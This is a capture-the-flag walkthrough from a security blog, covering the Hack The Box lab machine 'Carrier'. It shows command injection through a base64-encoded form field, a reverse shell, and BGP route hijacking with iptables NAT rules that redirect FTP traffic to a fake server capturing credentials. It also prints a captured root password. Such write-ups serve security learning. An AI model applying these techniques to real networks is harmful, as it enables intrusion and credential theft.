<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Hack The Box - Carrier - 0xRick’s Blog</title>
<meta name="description" content="My write-up / walkthrough for Carrier from Hack The Box.">


  <meta name="author" content="0xRick">
  
  <meta property="article:author" content="0xRick">
  


<meta property="og:type" content="article">
<meta property="og:locale" content="en">
<meta property="og:site_name" content="0xRick's Blog">
<meta property="og:title" content="Hack The Box - Carrier">
<meta property="og:url" content="https://0xrick.github.io/hack-the-box/carrier/">


  <meta property="og:description" content="My write-up / walkthrough for Carrier from Hack The Box.">





  <meta name="twitter:site" content="@ahm3d_h3sham">
  <meta name="twitter:title" content="Hack The Box - Carrier">
  <meta name="twitter:description" content="My write-up / walkthrough for Carrier from Hack The Box.">
  <meta name="twitter:url" content="https://0xrick.github.io/hack-the-box/carrier/">

  
    <meta name="twitter:card" content="summary">
    
  

  



  <meta property="article:published_time" content="2019-03-16T07:00:00+02:00">






<link rel="canonical" href="https://0xrick.github.io/hack-the-box/carrier/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "0xRick",
      "url": "https://0xrick.github.io/"
    
  }
</script>







<!-- end _includes/seo.html -->




<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">
<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
        <a class="site-title" href="/">
          0xRick's Blog
          
        </a>
        <ul class="visible-links">
<li class="masthead__menu-item">
              <a href="/about">About</a>
            </li>
<li class="masthead__menu-item">
              <a href="/categories">Categories</a>
            </li>
<li class="masthead__menu-item">
              <a href="/tags">Tags</a>
            </li>
</ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      
        <img src="/images/avatar.jpg" alt="0xRick" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">0xRick</h3>
    
    
      <div class="author__bio" itemprop="description">
        

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Somewhere between 1's and 0's</span>
        </li>
      

      
        
          
            <li><a href="/" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-home" aria-hidden="true"></i><span class="label">Home Page</span></a></li>
          
        
          
            <li><a href="https://twitter.com/ahm3d_h3sham" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
            <li><a href="https://github.com/0xRick" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">Github</span></a></li>
          
        
          
            <li><a href="https://www.buymeacoffee.com/VGEfcAqvn" rel="noopener noreferrer" target="_blank"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">buymeacoffee</span></a></li>
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>
 
  
  </div>


  <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Hack The Box - Carrier">
    <meta itemprop="description" content='Hack The Box - CarrierQuick SummaryHey guys today Carrier retired and here is my write-up about it. User on this box wasn’t hard to get , but for root it’s a different thing because we will go through some networking tricks and we will perform an attack called bgp hijacking. The overall experience was great and carrier was one of the best boxes on this platfrom. It’s a linux box and its ip is 10.10.10.105 I added it to /etc/hosts as carrier.htb. Let’s jump right in !NmapAs always we will start by using nmap to scan for open ports and services.nmap -sV -sT -sC carrier.htbWe get ftp on port 21 , ssh on port 22 and http on port 80. Some other boxes had anonymous ftp access allowed but here it’s not allowed , also the port is filtered so we are not going to check ftp.HTTP Initial EnumerationOn http there’s a web application called Lyghtspeed and we are asked to login. Under “Please login” we see that it’s saying Error 45007 and Error 45009 which is interesting.Next thing to check is sub directories enumeration :gobuster -u http://carrier.htb/ -w /usr/share/wordlists/dirb/common.txt -t 100 -to 200s=====================================================Gobuster v2.0.0              OJ Reeves (@TheColonial)=====================================================[+] Mode         : dir[+] Url/Domain   : http://carrier.htb/[+] Threads      : 100[+] Wordlist     : /usr/share/wordlists/dirb/common.txt[+] Status codes : 200,204,301,302,307,403[+] Timeout      : 3m20s=====================================================2019/03/15 11:50:56 Starting gobuster=====================================================/.hta (Status: 403)/.htaccess (Status: 403)/.htpasswd (Status: 403)/css (Status: 301)/debug (Status: 301)/doc (Status: 301)/fonts (Status: 301)/img (Status: 301)/index.php (Status: 200)/js (Status: 301)/server-status (Status: 403)/tools (Status: 301)We will only check interesting ones :/tools :It has a php file called remote.php and by checking it :It says “License expired, exiting…”/debug :It’s just phpinfo page /doc : There’s a pdf file and an image , the pdf file is called error_codes.pdf so it might be helpful because we saw earlier two errors on the login page.Error 45007 is “License invalid or expired”Error 45009 is “System credentials have not been set. Default admin user password is set (see chassis serial number)”So now we know that we need that serial number to be able to login , but how to get it ?More nmapAt this point we may think that there are other services running on the box and we have missed them. So before running a full tcp scan we will scan udp first.nmap -sU carrier.htbWe get dhcps on port 67 and snmp on port 161. Let’s check snmp.Snmp EnumerationSnmp stands for Simple Network Management Protocols and it’s an Internet Standard protocol for collecting and organizing information about managed devices on IP networks and for modifying that information to change device behavior. you can read more about it here.We will use a tool called snmpwalk , it’s an important tool in snmp enumeration and can tell us a lot of useful information. Read about snmpwalk heresnmpwalk -c public -v 1 carrier.htb-c for community string , -v for versionWe only get one result STRING: "SN#NET_45JDX23" so is that the serial number ? Let’s check admin : NET_45JDX23And it worked.Exploiting RCE and getting userDashboard , Tickets and Diagnostics are available. But Monitoring is disabled. Tickets are not important now but we will need them later.Diagnostics has a button saying verify status :After clicking :By looking at the source we find a hidden field called check , also if we used burp to intercept the requests we will find it. The value of check is base64 encoded string of “quagga” :We can try to encode “root” and see what happens :It gives us a different output :We can confirm that we have remote code execution by trying something like “quagga &amp;&amp; whoami &amp;&amp; id”And we see root , we can easily encode our reverse shell payload and get a reverse shell :But did we really get root access ? ifconfig and we see that we are not on the actual host which is 10.10.10.105 , we are on a different one.Anyway we owned the user flag !I also wrote a python script to automate the process of getting a reverse shell , I’ll post it later. (Update : Here is the script)Bgp Hijacking and getting rootWe saw “quagga” mentioned in the diagnostics page , but what is quagga ?Basically quagga is a routing software and since quagga is installed on this host then most likely we are going to perform bgp-hijacking or route-hijacking. I won’t go through a detailed explanation about this attack because that will be off-topic , I will include some resources. In simple words we are going to hijack another network prefixes and announce them to us , so if anybody tried to connect to that network they will connect to us. This is possible because we are on the host that is responsible for routing.Read about quaggaBgp Hijacking (wikipedia)Bgp Hijacking (internetsociety.org)Bgp Hijacking demoBgp Hijacking (blogs.akamai.com)If we take a look at the tickets again , ticket number 6 :We will notice this line : “one of their VIP is having issues connecting by FTP to an important server in the 10.120.15.0/24 network” , so on 10.120.15.0 there’s an FTP server and someone is accessing it regularly , on github there’s a python script called fake_ftp which creates an FTP server that steals credentials. We can try it locally with test:test: Now everything is ready , we just need to hijack 10.120.15.0 then run that fake ftp on the host and we will be able to steal credentials , but the script is written in python 2.7 and this host has only python 3 installed :We can fake an FTP server with nc or edit the script to work with python3 , but we will do something different , we will edit iptables rules to route traffic from port 21 on the host to port 21 on our box , so what will finally happen is :Someone tries to connect to the ftp server –&gt; connects to the router instead of the server –&gt; iptables routes that traffic to our box –&gt; our fake ftp server steals the credentialsin order to perform our attack we will edit bgpd.conf in /etc/quaggaOriginal :After edits :The only difference is this line network 10.120.15.0/25Now we will run a python simple http server to host the new bgpd.conf :pythom -m SimpleHTTPServer 80 Then we will delete the old one , download the new conf, edit iptables rules and finally restart the service :iptables commands :iptables -t nat -A PREROUTING -p tcp --dport 21 -j DNAT --to-destination 10.10.xx.xx:21iptables -t nat -A POSTROUTING -j MASQUERADEThen we will wait for someone to access the fake ftp server watch cat log.txt this will do cat log.txt and refresh it every 2 seconds (log.txt is where the captured credentials are stored) :Finally we get these credentials :root:BGPtelc0rout1ngNow we can ssh to the actual box as root :And we owned root !That’s it , Feedback is appreciated !Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter @Ahm3d_H3shamThanks for reading.Previous Hack The Box write-up : Hack The Box - EtherealNext Hack The Box write-up : Hack The Box - Frolic'>
    <meta itemprop="datePublished" content="2019-03-16T07:00:00+02:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title p-name" itemprop="headline">
            <a href="https://0xrick.github.io/hack-the-box/carrier/" class="u-url" itemprop="url">Hack The Box - Carrier
</a>
          </h1>
          

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-calendar-alt" aria-hidden="true"></i>
        
        <time datetime="2019-03-16T07:00:00+02:00">March 16, 2019</time>
      </span>
    

    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          6 minute read
        
      </span>
    
  </p>


        </header>
      

      <section class="page__content e-content" itemprop="text">
        <div>
          <style>
              #carbonads {
                border: 1px solid black;
                border-radius: 7px;
                border-spacing: 7px;
                display: block;
                overflow: hidden;
                padding: 1em;
                line-height: 1.5;
              }
              #carbonads span {
                position: relative;
                display: block;
                overflow: hidden;
              }
              .carbon-img img {
                display: block;
                float: left;
              }
              .carbon-text {
                display: block;
                font-size: .9em;
                text-align: end;
              }
              .carbon-poweredby {
                display: block;
                font-size: .8em;
                float: right;
                line-height: 1;
                letter-spacing: 1px;
                }
                </style>
                <br>   
          <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&amp;placement=0xrickgithubio" id="_carbonads_js"></script> 
                <br>
        </div>
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title">
<i class="fas fa-file-alt"></i> Contents</h4></header>
              <ul class="toc__menu"><li>
<a href="#hack-the-box---carrier">Hack The Box - Carrier</a><ul>
<li><a href="#quick-summary">Quick Summary</a></li>
<li><a href="#nmap">Nmap</a></li>
<li><a href="#http-initial-enumeration">HTTP Initial Enumeration</a></li>
<li><a href="#more-nmap">More nmap</a></li>
<li><a href="#snmp-enumeration">Snmp Enumeration</a></li>
<li><a href="#exploiting-rce-and-getting-user">Exploiting RCE and getting user</a></li>
<li><a href="#bgp-hijacking-and-getting-root">Bgp Hijacking and getting root</a></li>
</ul>
</li></ul>

            </nav>
          </aside>
        
        <h1 id="hack-the-box---carrier">Hack The Box - Carrier</h1>

<h2 id="quick-summary">Quick Summary</h2>
<p>Hey guys today Carrier retired and here is my write-up about it. User on this box wasn’t hard to get , but for root it’s a different thing because we will go through some networking tricks and we will perform an attack called bgp hijacking. The overall experience was great and carrier was one of the best boxes on this platfrom. It’s a linux box and its ip is <code class="language-plaintext highlighter-rouge">10.10.10.105</code> I added it to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> as <code class="language-plaintext highlighter-rouge">carrier.htb</code>. Let’s jump right in !
<br><img src="/images/hackthebox/carrier/0.png" alt="" class="align-center"><br><br></p>

<h2 id="nmap">Nmap</h2>
<p>As always we will start by using nmap to scan for open ports and services.<br>
<code class="language-plaintext highlighter-rouge">nmap -sV -sT -sC carrier.htb</code>
<br><img src="/images/hackthebox/carrier/1.png" alt="" class="align-center"><br><br>
We get ftp on port 21 , ssh on port 22 and http on port 80. Some other boxes had anonymous ftp access allowed but here it’s not allowed , also the port is filtered so we are not going to check ftp.<br></p>

<h2 id="http-initial-enumeration">HTTP Initial Enumeration</h2>
<p><br><img src="/images/hackthebox/carrier/2.png" alt="" class="align-center"><br><br>
On http there’s a web application called <code class="language-plaintext highlighter-rouge">Lyghtspeed</code> and we are asked to login. Under “Please login” we see that it’s saying <code class="language-plaintext highlighter-rouge">Error 45007</code> and <code class="language-plaintext highlighter-rouge">Error 45009</code> which is interesting.<br>
Next thing to check is sub directories enumeration :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster -u http://carrier.htb/ -w /usr/share/wordlists/dirb/common.txt -t 100 -to 200s

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://carrier.htb/
[+] Threads      : 100
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 3m20s
=====================================================
2019/03/15 11:50:56 Starting gobuster
=====================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/css (Status: 301)
/debug (Status: 301)
/doc (Status: 301)
/fonts (Status: 301)
/img (Status: 301)
/index.php (Status: 200)
/js (Status: 301)
/server-status (Status: 403)
/tools (Status: 301)
</code></pre></div></div>
<p>We will only check interesting ones :
<code class="language-plaintext highlighter-rouge">/tools</code> :
<br><img src="/images/hackthebox/carrier/3.png" alt="" class="align-center"><br><br>
It has a php file called <code class="language-plaintext highlighter-rouge">remote.php</code> and by checking it :
<br><img src="/images/hackthebox/carrier/4.png" alt="" class="align-center"><br><br>
It says “License expired, exiting…”
<code class="language-plaintext highlighter-rouge">/debug</code> :
<br><img src="/images/hackthebox/carrier/5.png" alt="" class="align-center"><br><br>
It’s just <code class="language-plaintext highlighter-rouge">phpinfo</code> page 
<code class="language-plaintext highlighter-rouge">/doc</code> : 
<br><img src="/images/hackthebox/carrier/6.png" alt="" class="align-center"><br><br>
There’s a pdf file and an image , the pdf file is called <code class="language-plaintext highlighter-rouge">error_codes.pdf</code> so it might be helpful because we saw earlier two errors on the login page.<br>
<br><img src="/images/hackthebox/carrier/7.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/carrier/8.png" alt="" class="align-center"><br><br>
Error <code class="language-plaintext highlighter-rouge">45007</code> is “License invalid or expired”
Error <code class="language-plaintext highlighter-rouge">45009</code> is “System credentials have not been set. Default admin user password is set (see chassis serial number)”
So now we know that we need that serial number to be able to login , but how to get it ?</p>

<h2 id="more-nmap">More nmap</h2>
<p>At this point we may think that there are other services running on the box and we have missed them. So before running a full tcp scan we will scan udp first.<br>
<code class="language-plaintext highlighter-rouge">nmap -sU carrier.htb</code>
<br><img src="/images/hackthebox/carrier/9.png" alt="" class="align-center"><br><br>
We get dhcps on port 67 and snmp on port 161. Let’s check snmp.<br></p>

<h2 id="snmp-enumeration">Snmp Enumeration</h2>
<p>Snmp stands for Simple Network Management Protocols and it’s an Internet Standard protocol for collecting and organizing information about managed devices on IP networks and for modifying that information to change device behavior. you can read more about it <a href="https://en.wikipedia.org/wiki/Simple_Network_Management_Protocol" target="_blank" rel="noopener noreferrer">here</a>.
<br>We will use a tool called <code class="language-plaintext highlighter-rouge">snmpwalk</code> , it’s an important tool in snmp enumeration and can tell us a lot of useful information. Read about snmpwalk <a href="http://net-snmp.sourceforge.net/docs/man/snmpwalk.html" target="_blank" rel="noopener noreferrer">here</a>
<br><code class="language-plaintext highlighter-rouge">snmpwalk -c public -v 1 carrier.htb</code>
<br><code class="language-plaintext highlighter-rouge">-c</code> for community string , <code class="language-plaintext highlighter-rouge">-v</code> for version
<br><img src="/images/hackthebox/carrier/10.png" alt="" class="align-center"><br><br>
We only get one result <code class="language-plaintext highlighter-rouge">STRING: "SN#NET_45JDX23"</code> so is that the serial number ? Let’s check 
<br><code class="language-plaintext highlighter-rouge">admin : NET_45JDX23</code>
<br><img src="/images/hackthebox/carrier/11.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/carrier/12.png" alt="" class="align-center"><br><br>
And it worked.<br></p>

<h2 id="exploiting-rce-and-getting-user">Exploiting RCE and getting user</h2>
<p>Dashboard , Tickets and Diagnostics are available. But Monitoring is disabled. Tickets are not important now but we will need them later.<br>
<br><img src="/images/hackthebox/carrier/13.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/carrier/14.png" alt="" class="align-center"><br><br>
Diagnostics has a button saying <code class="language-plaintext highlighter-rouge">verify status</code> :
<br><img src="/images/hackthebox/carrier/15.png" alt="" class="align-center"><br><br>
After clicking :
<br><img src="/images/hackthebox/carrier/16.png" alt="" class="align-center"><br><br>
By looking at the source we find a hidden field called <code class="language-plaintext highlighter-rouge">check</code> , also if we used burp to intercept the requests we will find it. The value of check is base64 encoded string of “quagga” :
<br><img src="/images/hackthebox/carrier/17.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/carrier/18.png" alt="" class="align-center"><br><br>
We can try to encode “root” and see what happens :
<br><img src="/images/hackthebox/carrier/19.png" alt="" class="align-center"><br><br>
It gives us a different output :
<br><img src="/images/hackthebox/carrier/20.png" alt="" class="align-center"><br><br>
We can confirm that we have remote code execution by trying something like “quagga &amp;&amp; whoami &amp;&amp; id”
<br><img src="/images/hackthebox/carrier/21.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/carrier/22.png" alt="" class="align-center"><br><br>
And we see root , we can easily encode our reverse shell payload and get a reverse shell :
<br><img src="/images/hackthebox/carrier/23.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/carrier/24.png" alt="" class="align-center"><br><br>
But did we really get root access ? <code class="language-plaintext highlighter-rouge">ifconfig</code> and we see that we are not on the actual host which is <code class="language-plaintext highlighter-rouge">10.10.10.105</code> , we are on a different one.<br>
<br><img src="/images/hackthebox/carrier/25.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/carrier/26.png" alt="" class="align-center"><br><br>
Anyway we owned the user flag !
I also wrote a python script to automate the process of getting a reverse shell , I’ll post it later. (Update : Here is the <a href="https://github.com/0xRick/CTF-scripts/blob/master/Hack%20The%20Box/carrier/reverse_shell.py" target="_blank" rel="noopener noreferrer">script</a>)</p>

<h2 id="bgp-hijacking-and-getting-root">Bgp Hijacking and getting root</h2>
<p>We saw “quagga” mentioned in the diagnostics page , but what is quagga ?
<br>Basically quagga is a routing software and since quagga is installed on this host then most likely we are going to perform bgp-hijacking or route-hijacking. I won’t go through a detailed explanation about this attack because that will be off-topic , I will include some resources. In simple words we are going to hijack another network prefixes and announce them to us , so if anybody tried to connect to that network they will connect to us. This is possible because we are on the host that is responsible for routing.<br>
Read about <a href="https://en.wikipedia.org/wiki/Quagga_(software)" target="_blank" rel="noopener noreferrer">quagga</a>
<br><a href="https://en.wikipedia.org/wiki/BGP_hijacking" target="_blank" rel="noopener noreferrer">Bgp Hijacking</a> (wikipedia)
<br><a href="https://www.internetsociety.org/blog/2018/05/what-is-bgp-hijacking-anyway/" target="_blank" rel="noopener noreferrer">Bgp Hijacking</a> (internetsociety.org)
<br><a href="https://github.com/mininet/mininet/wiki/BGP-Path-Hijacking-Attack-Demo" target="_blank" rel="noopener noreferrer">Bgp Hijacking demo</a>
<br><a href="https://blogs.akamai.com/2018/11/bgp-route-hijacking.html" target="_blank" rel="noopener noreferrer">Bgp Hijacking</a> (blogs.akamai.com)</p>

<p><br>If we take a look at the tickets again , ticket number 6 :
<br><img src="/images/hackthebox/carrier/14.png" alt="" class="align-center"><br><br>
We will notice this line : “one of their VIP is having issues connecting by FTP to an important server in the 10.120.15.0/24 network” , so on 10.120.15.0 there’s an FTP server and someone is accessing it regularly , on github there’s a python script called <a href="https://gist.github.com/neoplacer/6504e34a35a6df323b9c4a80da1a1180/c00a2a817fb1a1aaba3231bde7bb879312af2d51" target="_blank" rel="noopener noreferrer">fake_ftp</a> which creates an FTP server that steals credentials. We can try it locally with <code class="language-plaintext highlighter-rouge">test:test</code>: 
<br><img src="/images/hackthebox/carrier/27.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/carrier/28.png" alt="" class="align-center"><br><br>
Now everything is ready , we just need to hijack 10.120.15.0 then run that fake ftp on the host and we will be able to steal credentials , but the script is written in python 2.7 and this host has only python 3 installed :
<br><img src="/images/hackthebox/carrier/29.png" alt="" class="align-center"><br><br>
We can fake an FTP server with <code class="language-plaintext highlighter-rouge">nc</code> or edit the script to work with python3 , but we will do something different , we will edit <code class="language-plaintext highlighter-rouge">iptables</code> rules to route traffic from port 21 on the host to port 21 on our box , so what will finally happen is :
Someone tries to connect to the ftp server –&gt; connects to the router instead of the server –&gt; iptables routes that traffic to our box –&gt; our fake ftp server steals the credentials
<br>in order to perform our attack we will edit <code class="language-plaintext highlighter-rouge">bgpd.conf</code> in <code class="language-plaintext highlighter-rouge">/etc/quagga</code>
Original :
<br><img src="/images/hackthebox/carrier/30.png" alt="" class="align-center"><br><br>
After edits :
<br><img src="/images/hackthebox/carrier/31.png" alt="" class="align-center"><br><br>
The only difference is this line <code class="language-plaintext highlighter-rouge">network 10.120.15.0/25</code>
<br>Now we will run a python simple http server to host the new bgpd.conf :
<br><code class="language-plaintext highlighter-rouge">pythom -m SimpleHTTPServer 80</code> 
<br>Then we will delete the old one , download the new conf, edit iptables rules and finally restart the service :
<br><img src="/images/hackthebox/carrier/32.png" alt="" class="align-center"><br><br>
iptables commands :
<br><code class="language-plaintext highlighter-rouge">iptables -t nat -A PREROUTING -p tcp --dport 21 -j DNAT --to-destination 10.10.xx.xx:21</code>
<br><code class="language-plaintext highlighter-rouge">iptables -t nat -A POSTROUTING -j MASQUERADE</code>
<br>Then we will wait for someone to access the fake ftp server 
<br><code class="language-plaintext highlighter-rouge">watch cat log.txt</code> this will do <code class="language-plaintext highlighter-rouge">cat log.txt</code> and refresh it every 2 seconds (log.txt is where the captured credentials are stored) :
<br><img src="/images/hackthebox/carrier/33.png" alt="" class="align-center"><br><br>
Finally we get these credentials :
<code class="language-plaintext highlighter-rouge">root:BGPtelc0rout1ng</code>
<br>Now we can ssh to the actual box as root :
<br><img src="/images/hackthebox/carrier/34.png" alt="" class="align-center"><br><br>
And we owned root !</p>

<p><br>That’s it , Feedback is appreciated !
<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer">@Ahm3d_H3sham</a>
<br>Thanks for reading.<br></p>

<p>Previous Hack The Box write-up : <a href="/hack-the-box/ethereal/">Hack The Box - Ethereal</a>
<br>Next Hack The Box write-up : <a href="/hack-the-box/frolic/">Hack The Box - Frolic</a></p>


        
      </section>

      <footer class="page__meta">
        
        


        

  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-03-16T07:00:00+02:00">March 16, 2019</time></p>


      </footer>

      

      
  <nav class="pagination">
    
      <a href="/hack-the-box/ethereal/" class="pagination--pager" title="Hack The Box - Ethereal
">Previous</a>
    
    
      <a href="/binary-exploitation/bof6/" class="pagination--pager" title="Buffer Overflow Examples, Bypassing non-executable stack by re2libc - protostar stack6
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
</div>
    </div>

    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
    <ul class="social-icons">
      
  
      
  
      
    </ul>
  </div>
      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>







  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-97164925-2', { 'anonymize_ip': false});
</script>









  </body>
</html>
